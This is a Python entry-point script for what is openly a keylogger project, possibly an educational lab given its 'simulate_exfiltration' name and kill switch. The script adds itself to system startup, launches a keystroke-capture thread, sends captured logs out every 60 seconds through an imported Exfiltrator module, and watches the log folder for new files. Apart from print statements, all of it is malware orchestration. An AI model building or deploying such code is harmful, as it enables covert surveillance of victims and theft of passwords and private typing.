import threading
import time
import os
from logger.key_capture import KeyLogger
from logger.exfiltrator import Exfiltrator
from utils.persistence import add_to_startup, kill_switch_present
from utils.config import LOG_DIR

def start_keylogger():
    print("[*] Starting keylogger...")
    logger = KeyLogger()
    logger.start()

def simulate_exfiltration():
    while True:
        if kill_switch_present():
            print("[*] Kill switch detected. Stopping exfiltration.")
            break
        ex = Exfiltrator()
        ex.exfiltrate_logs()
        time.sleep(60)  # every 60 seconds

def monitor_logs():
    known = set(os.listdir(LOG_DIR))
    while not kill_switch_present():
        time.sleep(5)
        current = set(os.listdir(LOG_DIR))
        new_files = current - known
        for f in new_files:
            print(f"[+] New log detected: {f}")
        known = current

if __name__ == "__main__":
    add_to_startup()

    keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
    exfil_thread = threading.Thread(target=simulate_exfiltration, daemon=True)
    monitor_thread = threading.Thread(target=monitor_logs, daemon=True)

    keylogger_thread.start()
    exfil_thread.start()
    monitor_thread.start()

    try:
        keylogger_thread.join()
        exfil_thread.join()
        monitor_thread.join()
    except KeyboardInterrupt:
        print("\n[!] Keylogger stopped manually.")
